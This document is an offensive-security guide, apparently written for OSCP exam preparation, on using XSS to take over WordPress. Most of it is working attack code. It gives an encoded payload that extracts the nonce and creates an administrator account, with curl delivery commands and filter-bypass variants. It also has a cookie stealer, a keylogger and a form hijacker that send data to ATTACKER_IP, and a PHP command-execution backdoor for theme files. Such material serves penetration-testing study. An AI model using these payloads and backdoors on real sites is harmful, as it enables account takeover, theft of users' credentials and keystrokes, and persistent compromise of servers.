# XSS Privilege Escalation Guide

## Overview
This guide covers exploiting Cross-Site Scripting (XSS) vulnerabilities to achieve privilege escalation in web applications, focusing on WordPress as a practical example from OSCP labs.

## Understanding XSS Attack Vectors

### Cookie Security Flags
```bash
# Check cookie flags in browser DevTools > Storage > Cookies
# Key flags to examine:
- Secure: Cookie only sent over HTTPS
- HttpOnly: Cookie not accessible via JavaScript (blocks XSS theft)
- SameSite: CSRF protection
```

### Testing for HttpOnly
```javascript
// Quick test in browser console
document.cookie
// If session cookies missing = HttpOnly is set
// If visible = vulnerable to theft
```

## Attack Strategy When Cookies Are Protected

### When HttpOnly Blocks Cookie Theft
If session cookies have HttpOnly flag:
- Cannot steal via `document.cookie`
- Must pivot to different attack vector
- Execute actions as the victim instead

### Alternative: Administrative Action Execution
Instead of stealing credentials, make the admin perform actions:
1. Create new admin account
2. Modify existing permissions
3. Execute server commands
4. Upload malicious files

## WordPress Admin Account Creation Attack

### Phase 1: Nonce Extraction
```javascript
// WordPress nonce extraction
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Purpose: Extract CSRF token (nonce) from admin page
// nonceRegex: Captures value between 'ser" value="' and '"'
// false: Synchronous request (waits for response)
```

### Phase 2: Create Admin User
```javascript
// Build admin creation parameters
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";

// Send user creation request
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

// Parameters explained:
// action=createuser: WordPress action
// _wpnonce_create-user: CSRF token
// user_login: New username
// role=administrator: Admin privileges
```

## Payload Preparation

### Step 1: Combine Code
```javascript
// Full attack payload
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### Step 2: Minify JavaScript
Use online tool or command line:
```bash
# Online: https://jscompress.com
# Or use terser locally:
npm install -g terser
terser input.js -c -m -o minified.js
```

### Step 3: Encode Payload
```javascript
// Encoding function
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

// Usage
let encoded = encode_to_javascript('MINIFIED_JS_HERE')
console.log(encoded)
// Output: 118,97,114,32,97,106,97,120...
```

### Step 4: Wrap for Execution
```javascript
// Final payload structure
<script>eval(String.fromCharCode(ENCODED_NUMBERS_HERE))</script>

// String.fromCharCode: Converts numbers back to characters
// eval: Executes the decoded JavaScript
```

## Delivery Methods

### Method 1: Stored XSS via User-Agent
```bash
curl -i http://TARGET/vulnerable-page \
  --user-agent "<script>eval(String.fromCharCode(118,97,114...))</script>" \
  --proxy 127.0.0.1:8080

# Purpose: Store malicious User-Agent in database
# -i: Include response headers
# --user-agent: Custom User-Agent header
# --proxy: Route through Burp for inspection
```

### Method 2: Reflected XSS via URL Parameter
```bash
# Direct GET request
curl "http://TARGET/page.php?search=<script>eval(String.fromCharCode(118,97,114...))</script>"

# URL encoded version
curl "http://TARGET/page.php?search=%3Cscript%3Eeval(String.fromCharCode(118%2C97%2C114...))%3C%2Fscript%3E"
```

### Method 3: POST Parameter Injection
```bash
curl -X POST http://TARGET/comment.php \
  -d "name=Test&comment=<script>eval(String.fromCharCode(118,97,114...))</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

## Understanding CSRF Protection

### What is a Nonce?
```
Nonce = "Number used ONCE"
- Server-generated random token
- Prevents Cross-Site Request Forgery (CSRF)
- Must be included in state-changing requests
- Changes with each session/request
```

### Why XSS Bypasses CSRF Protection
```
Normal CSRF Attack (Blocked):
1. Attacker crafts malicious link with action
2. Victim clicks link
3. Request fails - no valid nonce

XSS-Enhanced Attack (Succeeds):
1. XSS payload runs in victim's context
2. JavaScript fetches current nonce
3. Uses nonce in forged request
4. Request succeeds - valid nonce included
```

## Alternative XSS Payloads

### Cookie Stealer (When HttpOnly Not Set)
```javascript
// Steal cookies and send to attacker
var img = new Image();
img.src = "http://ATTACKER_IP/steal.php?cookie=" + document.cookie;

// Encoded version
<script>eval(String.fromCharCode(118,97,114,32,105,109,103,61,110,101,119,32,73,109,97,103,101,40,41,59,105,109,103,46,115,114,99,61,34,104,116,116,112,58,47,47,65,84,84,65,67,75,69,82,95,73,80,47,115,116,101,97,108,46,112,104,112,63,99,111,111,107,105,101,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))</script>
```

### Keylogger Injection
```javascript
// Log keystrokes and exfiltrate
document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://ATTACKER_IP/log.php?key=" + e.key, true);
    xhr.send();
});
```

### Form Hijacker
```javascript
// Redirect form submissions to attacker
document.forms[0].action = "http://ATTACKER_IP/capture.php";
```

## Troubleshooting XSS Exploitation

### Issue: Payload Not Executing
```bash
# Check 1: View page source for exact storage
curl http://TARGET/vulnerable-page | grep -i script

# Check 2: Test simpler payloads first
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Check 3: Verify Content-Type header
curl -I http://TARGET/page
# Should be text/html, not text/plain
```

### Issue: Encoding Problems
```bash
# Try different encoding methods:

# HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

# URL encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Unicode encoding
\u003cscript\u003ealert(1)\u003c/script\u003e

# Base64 (with decoder)
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Issue: WAF/Filter Bypass
```javascript
// Bypass keyword filters
<ScRiPt>alert(1)</ScRiPt>
<script>al\u0065rt(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>

// Bypass tag filters
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>

// Bypass parentheses filter
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
```

## Detection and Verification

### Verify Admin Creation Success
```bash
# Method 1: Try logging in
curl -d "log=attacker&pwd=attackerpass" \
     -c cookies.txt \
     http://TARGET/wp-login.php

# Method 2: Check users page (if accessible)
curl http://TARGET/wp-admin/users.php

# Method 3: Enumerate users via API
curl http://TARGET/wp-json/wp/v2/users
```

### Monitor JavaScript Execution
```javascript
// Add debug logging to payload
console.log("Stage 1: Fetching nonce");
// ... fetch nonce ...
console.log("Nonce obtained: " + nonce);
// ... create user ...
console.log("User creation request sent");
```

## Burp Suite Integration

### Intercept and Modify
```
1. Set proxy: --proxy 127.0.0.1:8080
2. Intercept request in Burp
3. Modify User-Agent or parameters
4. Right-click > "Send to Repeater" for testing
5. Forward modified request
```

### Payload Testing in Repeater
```
1. Send base request to Repeater
2. Modify one parameter at a time
3. Test different encodings
4. Observe response differences
5. Find working payload
```

## Post-Exploitation

### After Gaining Admin Access
```bash
# 1. Upload web shell via plugin
# Create malicious plugin with PHP shell

# 2. Modify theme files
# Add PHP backdoor to 404.php or footer.php

# 3. Create database admin
# Use phpMyAdmin or wp-cli

# 4. Export sensitive data
# Download wp-config.php for database credentials
```

### Maintaining Access
```php
// Simple PHP backdoor in theme
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>"; $cmd = ($_REQUEST['cmd']);
    system($cmd); echo "</pre>"; die;
}
?>
// Access: http://TARGET/wp-content/themes/twentytwenty/404.php?cmd=id
```

## OSCP Exam Tips

### Documentation Requirements
1. **Screenshot XSS trigger point** (form field, URL parameter)
2. **Show payload in Burp** before sending
3. **Capture successful execution** (alert box, new user)
4. **Document full exploit chain** step by step
5. **Save working payloads** in notes

### Time-Saving Tips
- Pre-encode common payloads
- Test simplest payload first (alert)
- Use Burp Repeater for rapid testing
- Check for XSS in User-Agent, Referer, Cookie headers
- Look for stored XSS in comments, profiles, logs

### Common WordPress XSS Locations
- Plugin settings pages
- Comment forms (if filters bypassed)
- User profile fields
- Custom post types
- Media upload metadata
- Theme customizer

## Quick Reference Commands

### Test XSS Quickly
```bash
# Test reflected XSS
curl "http://TARGET/search.php?q=<script>alert(1)</script>"

# Test stored XSS
curl -d "comment=<script>alert(1)</script>" http://TARGET/comment.php

# Test DOM XSS
curl "http://TARGET/#<script>alert(1)</script>"
```

### Exploit Template
```bash
# 1. Find injection point
# 2. Test basic alert
# 3. Encode complex payload
# 4. Deliver via curl/Burp
# 5. Trigger execution
# 6. Verify success
```

## Key Takeaways

1. **HttpOnly blocks cookie theft** but not action execution
2. **Nonce extraction** bypasses CSRF protection
3. **Encoding** evades filters and ensures delivery
4. **Stored XSS** is more reliable than reflected
5. **Admin access** leads to full compromise
6. **Document everything** for OSCP report